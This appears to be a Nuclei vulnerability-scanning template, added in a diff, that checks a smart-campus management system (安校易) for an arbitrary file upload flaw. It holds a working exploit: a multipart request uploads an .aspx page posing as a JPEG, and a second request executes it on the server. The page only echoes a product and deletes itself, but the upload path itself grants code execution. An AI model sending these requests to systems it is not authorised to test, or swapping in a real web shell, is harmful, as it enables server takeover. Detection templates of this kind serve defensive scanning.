@@ -1,0 +1,48 @@
+id: anxiaoyi-receiveclassvideo-upload
+
+info:
+  name: 安校易 ReceiveClassVideo.ashx - 任意文件上传
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    银达汇智智慧校园(安校易)管理系统 ReceiveClassVideo 任意文件上传漏洞。
+
+variables:
+  rfilename: "{{rand_base(4)}}"
+  s1: "{{rand_int(40000, 44800)}}"
+  s2: "{{rand_int(40000, 44800)}}"
+  rboundary: "{{rand_base(8)}}"
+
+http:
+  - raw:
+      - |
+        POST /Tool/ReceiveClassVideo.ashx?file_tmid={{rfilename}}&orgid=1&classID=1 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+
+        ------WebKitFormBoundary{{rboundary}}
+        Content-Disposition: form-data; name="File1"; filename="{{rfilename}}.aspx"
+        Content-Type: image/jpeg
+
+        <%@Page Language="C#" %>
+        <% Response.Write({{s1}}*{{s2}}); System.IO.File.Delete(Request.PhysicalPath); %>
+        ------WebKitFormBoundary{{rboundary}}--
+
+      - |
+        GET /Upload/AD_Info/1/{{rfilename}}.aspx HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        part: status_code_1
+        status:
+          - 200
+      - type: status
+        part: status_code_2
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{s1 * s2}}"
